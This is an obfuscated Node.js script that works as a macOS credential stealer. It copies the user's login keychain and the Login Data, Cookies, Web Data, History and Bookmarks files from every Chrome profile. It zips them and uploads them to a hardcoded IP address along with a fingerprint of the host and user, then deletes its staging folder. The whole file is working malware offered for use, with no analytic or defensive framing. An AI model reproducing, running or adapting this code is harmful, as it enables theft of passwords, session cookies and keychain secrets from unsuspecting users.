function _0x5ef8(_0x4e4042,_0xb9fbca){const _0x314269=_0x3142();return _0x5ef8=function(_0x5ef83a,_0x372a7f){_0x5ef83a=_0x5ef83a-0x7c;let _0x247669=_0x314269[_0x5ef83a];return _0x247669;},_0x5ef8(_0x4e4042,_0xb9fbca);}const _0x133fbf=_0x5ef8;(function(_0x520f39,_0x5391c3){const _0xebd11b=_0x5ef8,_0x541e36=_0x520f39();while(!![]){try{const _0x8df413=-parseInt(_0xebd11b(0x85))/0x1+parseInt(_0xebd11b(0xf2))/0x2*(-parseInt(_0xebd11b(0x105))/0x3)+-parseInt(_0xebd11b(0xe7))/0x4+parseInt(_0xebd11b(0xb5))/0x5+-parseInt(_0xebd11b(0xcc))/0x6*(parseInt(_0xebd11b(0x100))/0x7)+-parseInt(_0xebd11b(0xd6))/0x8*(parseInt(_0xebd11b(0x83))/0x9)+parseInt(_0xebd11b(0xf4))/0xa;if(_0x8df413===_0x5391c3)break;else _0x541e36['push'](_0x541e36['shift']());}catch(_0x7ca6d0){_0x541e36['push'](_0x541e36['shift']());}}}(_0x3142,0x7fd93));const fs=require('fs'),os=require('os'),path=require(_0x133fbf(0x10e)),{exec,execSync}=require(_0x133fbf(0xaa)),crypto=require(_0x133fbf(0xb8)),axios=require('axios'),FormData=require(_0x133fbf(0xba)),CONFIG={'serverUrl':_0x133fbf(0x10d),'apiKey':'tJz4uRVCwl2eEwyPTudYP9iGRfgq','chunkSize':0x100*0x400,'retryDelay':0x1388,'maxRetries':0x5,'timeout':0x1d4c0,'stableDir':_0x133fbf(0x10c),'zipFileName':_0x133fbf(0x9c),'chromeImportantFiles':[_0x133fbf(0x81),'Web\x20Data-journal','Login\x20Data',_0x133fbf(0xd9),_0x133fbf(0xea),_0x133fbf(0xbe),_0x133fbf(0x82),_0x133fbf(0x10b),_0x133fbf(0xfe),_0x133fbf(0xdc)]};function _0x3142(){const _0x2ed9a3=['2412080CJSDEQ','version','networkInterfaces','History','КРИТИЧЕСКАЯ\x20ОШИБКА:\x20Файл\x20не\x20найден:\x20','Зависимости\x20успешно\x20установлены','statSync','Failed\x20to\x20create\x20Stable\x20directory','code','=====\x20СБОР\x20ДАННЫХ\x20ЗАВЕРШЕН\x20=====','Статус\x20ответа:\x20','745546DBVkft','readdirSync','19898410YXWjoo','\x20удалена','./node_modules/axios','username','substring','length','Информация\x20о\x20системе:\x20','status','stringify','total','Bookmarks','userInfo','786268DFhOJY','\x20имеет\x20нулевой\x20размер!','==========\x20НАЧАЛО\x20ПРОЦЕССА\x20СБОРА\x20И\x20ОТПРАВКИ\x20ДАННЫХ\x20==========','Profile\x20','=====\x20ОТПРАВКА\x20АРХИВА\x20ЗАВЕРШЕНА\x20=====','3jByQSH','unknown','hex','/Users/','keys','\x20-x\x20\x22*.DS_Store\x22','Cookies-journal','Stable','http://65.87.7.103:8088/api/files/upload','path','Error\x20copying\x20Chrome\x20data:\x20','loaded','Предупреждение:\x20Ошибка\x20при\x20удалении\x20временных\x20файлов:\x20','Found\x20','basename','Web\x20Data','Cookies','45PNZECS','timeout','100484OeeJrG','stableDir','success','message','/Library/Keychains/login.keychain-db','existsSync','Chrome\x20data\x20for\x20profile\x20','Current\x20user:\x20','push','Версия\x20Node.js:\x20','serverUrl','trim','request','name','size','retryDelay','Default','zipFileName','maxRetries','URL\x20сервера:\x20','Error\x20creating\x20directory\x20','isDirectory','join','Stable.zip','ZIP\x20archive\x20created\x20successfully','log','Error\x20executing\x20command:\x20','==========\x20СБОР\x20И\x20ОТПРАВКА\x20ДАННЫХ\x20УСПЕШНО\x20ЗАВЕРШЕНЫ\x20==========','ОШИБКА\x20ПРИ\x20ЗАГРУЗКЕ\x20(попытка\x20','Error\x20scanning\x20Chrome\x20profiles:\x20','\x20->\x20','\x20секунд...','mkdirSync','stderr','random','error','Error\x20writing\x20to\x20log:\x20','child_process','Статус\x20ошибки:\x20','update','floor','login.keychain-db','stderr:\x20','platform','Directory\x20created:\x20','Директория\x20запуска:\x20','hostname','toFixed','2987070YOpWLH','\x20KB/s)','arch','crypto','Executing\x20command:\x20','form-data','Bytes','zip\x20-r\x20-1\x20','Keychain\x20file\x20not\x20found:\x20','History-journal','ФАТАЛЬНАЯ\x20ОШИБКА:\x20','Прогресс\x20загрузки:\x20','Chrome\x20file\x20not\x20found\x20in\x20profile\x20','type','copyFileSync','round','Текущая\x20директория:\x20','Chrome\x20directory\x20not\x20found:\x20','rm\x20-rf\x20','now','application/zip','Установка\x20необходимых\x20зависимостей...','exit','24rLrGym','\x20байт\x20(','%\x20(','response','0\x20Bytes','Предупреждение:\x20Не\x20удалось\x20проверить/установить\x20зависимости:\x20','chromeImportantFiles','ОШИБКА:\x20Файл\x20','toISOString','getLengthSync','860824eyZHFu','Отправка\x20началась\x20в:\x20','mac','Login\x20Data-journal','/Library/Application\x20Support/Google/Chrome','Превышено\x20максимальное\x20количество\x20попыток\x20(','Secure\x20Preferences','data','=====\x20НАЧАЛО\x20ОТПРАВКИ\x20АРХИВА\x20=====','cwd','pow','Данные\x20ошибки:\x20','Archive\x20size:\x20','Стек\x20ошибки:\x20','toString','\x20секунд\x20(','digest'];_0x3142=function(){return _0x2ed9a3;};return _0x3142();}function log(_0x1167ef,_0x54b40d=![]){const _0xc3aa36=_0x133fbf,_0x1b52ce=new Date()[_0xc3aa36(0xd4)](),_0x937a52='['+_0x1b52ce+']\x20'+_0x1167ef;_0x54b40d?console[_0xc3aa36(0xa8)](_0x937a52):console[_0xc3aa36(0x9e)](_0x937a52);try{fs['appendFileSync']('collector.log',_0x937a52+'\x0a');}catch(_0x5f5a9a){console['error'](_0xc3aa36(0xa9)+_0x5f5a9a[_0xc3aa36(0x88)]);}}function createDirectory(_0x56621a){const _0x24f677=_0x133fbf;try{return!fs[_0x24f677(0x8a)](_0x56621a)?(fs[_0x24f677(0xa5)](_0x56621a,{'recursive':!![]}),log(_0x24f677(0xb1)+_0x56621a)):log('Directory\x20already\x20exists:\x20'+_0x56621a),!![];}catch(_0x21c9b4){return log(_0x24f677(0x99)+_0x56621a+':\x20'+_0x21c9b4[_0x24f677(0x88)],!![]),![];}}function copyFile(_0x140622,_0x15a06b){const _0x2fc18b=_0x133fbf;try{return fs[_0x2fc18b(0xc3)](_0x140622,_0x15a06b),log('File\x20copied:\x20'+_0x140622+_0x2fc18b(0xa3)+_0x15a06b),!![];}catch(_0x9cff2){return log('Error\x20copying\x20file\x20'+_0x140622+':\x20'+_0x9cff2['message'],!![]),![];}}function executeCommand(_0x49018b){const _0x80d684=_0x133fbf;try{log(_0x80d684(0xb9)+_0x49018b);const _0x40376f=execSync(_0x49018b,{'encoding':'utf8'});return log('Command\x20output:\x20'+_0x40376f[_0x80d684(0x90)]()),{'success':!![],'output':_0x40376f};}catch(_0x2c565b){log(_0x80d684(0x9f)+_0x2c565b[_0x80d684(0x88)],!![]);if(_0x2c565b[_0x80d684(0xa6)])log(_0x80d684(0xaf)+_0x2c565b['stderr'],!![]);return{'success':![],'error':_0x2c565b};}}function formatFileSize(_0x853415){const _0x1f4be4=_0x133fbf;if(_0x853415===0x0)return _0x1f4be4(0xd0);const _0x376447=0x400,_0x1f0e13=[_0x1f4be4(0xbb),'KB','MB','GB','TB'],_0x2d782d=Math[_0x1f4be4(0xad)](Math['log'](_0x853415)/Math[_0x1f4be4(0x9e)](_0x376447));return parseFloat((_0x853415/Math[_0x1f4be4(0xe0)](_0x376447,_0x2d782d))[_0x1f4be4(0xb4)](0x2))+'\x20'+_0x1f0e13[_0x2d782d];}function generateClientId(){const _0xc9022d=_0x133fbf;try{const _0x4d4212=getMacAddress(),_0x325715=os[_0xc9022d(0xb3)](),_0x5c8067=os['userInfo']()[_0xc9022d(0xf7)],_0x3e23fd=crypto['createHash']('md5')[_0xc9022d(0xac)](_0x4d4212+':'+_0x325715+':'+_0x5c8067)[_0xc9022d(0xe6)](_0xc9022d(0x107))[_0xc9022d(0xf8)](0x0,0x8);return _0x3e23fd;}catch(_0x14054e){return Math[_0xc9022d(0xa7)]()[_0xc9022d(0xe4)](0x24)[_0xc9022d(0xf8)](0x2,0xa);}}function getMacAddress(){const _0x5c0761=_0x133fbf;try{const _0x4b43cb=os[_0x5c0761(0xe9)]();for(const _0x1924d3 of Object[_0x5c0761(0x109)](_0x4b43cb)){for(const _0x251fdf of _0x4b43cb[_0x1924d3]){if(!_0x251fdf['internal']&&_0x251fdf[_0x5c0761(0xd8)]!=='00:00:00:00:00:00')return _0x251fdf[_0x5c0761(0xd8)];}}return'unknown';}catch(_0xfbb3e9){return _0x5c0761(0x106);}}async function collectData(){const _0x530514=_0x133fbf;try{log('=====\x20НАЧАЛО\x20СБОРА\x20ДАННЫХ\x20=====');if(!createDirectory(CONFIG['stableDir']))throw new Error(_0x530514(0xee));const _0x484ebf=os[_0x530514(0xff)]()[_0x530514(0xf7)];log(_0x530514(0x8c)+_0x484ebf);const _0x481e20=_0x530514(0x108)+_0x484ebf+_0x530514(0x89),_0x2d9dd1=path[_0x530514(0x9b)](CONFIG[_0x530514(0x86)],_0x530514(0xae));fs['existsSync'](_0x481e20)?copyFile(_0x481e20,_0x2d9dd1):log(_0x530514(0xbd)+_0x481e20,!![]);try{const _0xd59b69=_0x530514(0x108)+_0x484ebf+_0x530514(0xda);if(fs['existsSync'](_0xd59b69)){const _0x6f30f4=[];fs[_0x530514(0x8a)](path[_0x530514(0x9b)](_0xd59b69,_0x530514(0x95)))&&_0x6f30f4[_0x530514(0x8d)]('Default');try{const _0x51e0cc=fs['readdirSync'](_0xd59b69,{'withFileTypes':!![]});for(const _0x51bf07 of _0x51e0cc){_0x51bf07[_0x530514(0x9a)]()&&_0x51bf07[_0x530514(0x92)]['startsWith'](_0x530514(0x103))&&_0x6f30f4['push'](_0x51bf07[_0x530514(0x92)]);}}catch(_0x22620b){log(_0x530514(0xa2)+_0x22620b[_0x530514(0x88)],!![]);}log(_0x530514(0x7f)+_0x6f30f4[_0x530514(0xf9)]+'\x20Chrome\x20profiles:\x20'+_0x6f30f4[_0x530514(0x9b)](',\x20'));for(const _0x4fc2e9 of _0x6f30f4){const _0x1312e9=path[_0x530514(0x9b)](_0xd59b69,_0x4fc2e9),_0x5de308=path[_0x530514(0x9b)](CONFIG[_0x530514(0x86)],'Chrome_'+_0x4fc2e9);createDirectory(_0x5de308);for(const _0x1608da of CONFIG[_0x530514(0xd2)]){const _0x1d040d=path[_0x530514(0x9b)](_0x1312e9,_0x1608da),_0x542c0f=path[_0x530514(0x9b)](_0x5de308,_0x1608da);fs['existsSync'](_0x1d040d)?copyFile(_0x1d040d,_0x542c0f):log(_0x530514(0xc1)+_0x4fc2e9+':\x20'+_0x1d040d);}log(_0x530514(0x8b)+_0x4fc2e9+'\x20copied\x20successfully');}}else log(_0x530514(0xc6)+_0xd59b69,!![]);}catch(_0x1059f4){log(_0x530514(0x7c)+_0x1059f4['message'],!![]);}log('Creating\x20ZIP\x20archive...');const _0x111205=executeCommand(_0x530514(0xbc)+CONFIG[_0x530514(0x96)]+'\x20'+CONFIG[_0x530514(0x86)]+_0x530514(0x10a));if(!_0x111205[_0x530514(0x87)])throw new Error('Failed\x20to\x20create\x20ZIP\x20archive');log(_0x530514(0x9d));if(fs[_0x530514(0x8a)](CONFIG[_0x530514(0x96)])){const _0x1185cd=fs[_0x530514(0xed)](CONFIG[_0x530514(0x96)]);log(_0x530514(0xe2)+formatFileSize(_0x1185cd[_0x530514(0x93)]));}else throw new Error('ZIP\x20archive\x20file\x20not\x20found\x20after\x20creation');return log(_0x530514(0xf0)),!![];}catch(_0xabc701){return log('Error\x20in\x20data\x20collection:\x20'+_0xabc701[_0x530514(0x88)],!![]),![];}}async function uploadFile(_0x11bded=0x0){const _0x2b001f=_0x133fbf;try{const _0x2be1fc=path['join'](process['cwd'](),CONFIG[_0x2b001f(0x96)]);if(!fs[_0x2b001f(0x8a)](_0x2be1fc))return log(_0x2b001f(0xeb)+_0x2be1fc,!![]),log(_0x2b001f(0xc5)+process[_0x2b001f(0xdf)](),!![]),log('Содержимое\x20директории:\x20'+fs[_0x2b001f(0xf3)](process[_0x2b001f(0xdf)]())[_0x2b001f(0x9b)](',\x20'),!![]),![];const _0x113b0d=fs['statSync'](_0x2be1fc),_0x1c8221=_0x113b0d[_0x2b001f(0x93)];log('Размер\x20файла:\x20'+_0x1c8221+_0x2b001f(0xcd)+formatFileSize(_0x1c8221)+')');if(_0x1c8221===0x0)return log(_0x2b001f(0xd3)+CONFIG[_0x2b001f(0x96)]+_0x2b001f(0x101),!![]),![];const _0x5287d7=new FormData();_0x5287d7['append']('file',fs['createReadStream'](_0x2be1fc),{'filename':path[_0x2b001f(0x80)](_0x2be1fc),'contentType':_0x2b001f(0xc9),'knownLength':_0x1c8221});const _0x3505f9={'hostname':os['hostname'](),'platform':os[_0x2b001f(0xb0)](),'type':os[_0x2b001f(0xc2)](),'arch':os[_0x2b001f(0xb7)](),'username':os[_0x2b001f(0xff)]()['username'],'id':generateClientId()};log(_0x2b001f(0xde)),log(_0x2b001f(0xfa)+JSON[_0x2b001f(0xfc)](_0x3505f9)),log(_0x2b001f(0x98)+CONFIG[_0x2b001f(0x8f)]);const _0x342a4e=Date[_0x2b001f(0xc8)]();log(_0x2b001f(0xd7)+new Date(_0x342a4e)[_0x2b001f(0xd4)]());const _0x150baa=await axios['post'](CONFIG[_0x2b001f(0x8f)],_0x5287d7,{'headers':{..._0x5287d7['getHeaders'](),'X-Client-Info':JSON[_0x2b001f(0xfc)](_0x3505f9),'Content-Length':_0x5287d7[_0x2b001f(0xd5)]()},'maxContentLength':Infinity,'maxBodyLength':Infinity,'timeout':CONFIG[_0x2b001f(0x84)],'onUploadProgress':_0x371648=>{const _0x47d458=_0x2b001f,_0x12fa66=Math[_0x47d458(0xc4)](_0x371648[_0x47d458(0x7d)]*0x64/_0x371648[_0x47d458(0xfd)]);log(_0x47d458(0xc0)+_0x12fa66+_0x47d458(0xce)+formatFileSize(_0x371648[_0x47d458(0x7d)])+'/'+formatFileSize(_0x371648[_0x47d458(0xfd)])+')');}}),_0x4b1c71=Date[_0x2b001f(0xc8)](),_0x1f7787=(_0x4b1c71-_0x342a4e)/0x3e8,_0x451af3=_0x1c8221/_0x1f7787/0x400;return log('Загрузка\x20завершена\x20за\x20'+_0x1f7787[_0x2b001f(0xb4)](0x1)+_0x2b001f(0xe5)+_0x451af3[_0x2b001f(0xb4)](0x2)+_0x2b001f(0xb6)),log(_0x2b001f(0xf1)+_0x150baa[_0x2b001f(0xfb)]),log('Ответ\x20сервера:\x20'+JSON['stringify'](_0x150baa['data'])),log(_0x2b001f(0x104)),_0x150baa[_0x2b001f(0xdd)]['success'];}catch(_0x507844){log(_0x2b001f(0xa1)+(_0x11bded+0x1)+'/'+CONFIG[_0x2b001f(0x97)]+'):',!![]);if(_0x507844['response'])log(_0x2b001f(0xab)+_0x507844[_0x2b001f(0xcf)]['status'],!![]),log(_0x2b001f(0xe1)+JSON['stringify'](_0x507844['response'][_0x2b001f(0xdd)]),!![]);else _0x507844[_0x2b001f(0x91)]?(log('Нет\x20ответа\x20от\x20сервера',!![]),log('Тип\x20ошибки:\x20'+_0x507844[_0x2b001f(0xef)],!![])):log('Ошибка\x20настройки:\x20'+_0x507844[_0x2b001f(0x88)],!![]);if(_0x11bded<CONFIG[_0x2b001f(0x97)])return log('Повторная\x20попытка\x20через\x20'+CONFIG[_0x2b001f(0x94)]/0x3e8+_0x2b001f(0xa4)),await new Promise(_0x496b04=>setTimeout(_0x496b04,CONFIG['retryDelay'])),uploadFile(_0x11bded+0x1);return log(_0x2b001f(0xdb)+CONFIG[_0x2b001f(0x97)]+')',!![]),![];}}async function main(){const _0x3a0af7=_0x133fbf;try{log(_0x3a0af7(0x102)),log(_0x3a0af7(0x8e)+process[_0x3a0af7(0xe8)]),log('Платформа:\x20'+process[_0x3a0af7(0xb0)]),log(_0x3a0af7(0xb2)+process['cwd']());try{(!fs[_0x3a0af7(0x8a)](_0x3a0af7(0xf6))||!fs[_0x3a0af7(0x8a)]('./node_modules/form-data'))&&(log(_0x3a0af7(0xca)),execSync('npm\x20install\x20axios\x20form-data'),log(_0x3a0af7(0xec)));}catch(_0xc553fb){log(_0x3a0af7(0xd1)+_0xc553fb[_0x3a0af7(0x88)]);}const _0x5d1cc4=await collectData();!_0x5d1cc4&&(log('Сбор\x20данных\x20завершился\x20с\x20ошибкой',!![]),process[_0x3a0af7(0xcb)](0x1));const _0x146634=await uploadFile();if(_0x146634){log(_0x3a0af7(0xa0));try{fs[_0x3a0af7(0x8a)](CONFIG[_0x3a0af7(0x86)])&&(executeCommand(_0x3a0af7(0xc7)+CONFIG[_0x3a0af7(0x86)]),log('Временная\x20директория\x20'+CONFIG[_0x3a0af7(0x86)]+_0x3a0af7(0xf5)));}catch(_0x19ab2a){log(_0x3a0af7(0x7e)+_0x19ab2a[_0x3a0af7(0x88)]);}process[_0x3a0af7(0xcb)](0x0);}else log('==========\x20ОШИБКА\x20ОТПРАВКИ\x20ДАННЫХ\x20==========',!![]),process[_0x3a0af7(0xcb)](0x1);}catch(_0x1723ac){log(_0x3a0af7(0xbf)+_0x1723ac[_0x3a0af7(0x88)],!![]),log(_0x3a0af7(0xe3)+_0x1723ac['stack'],!![]),process['exit'](0x1);}}main();
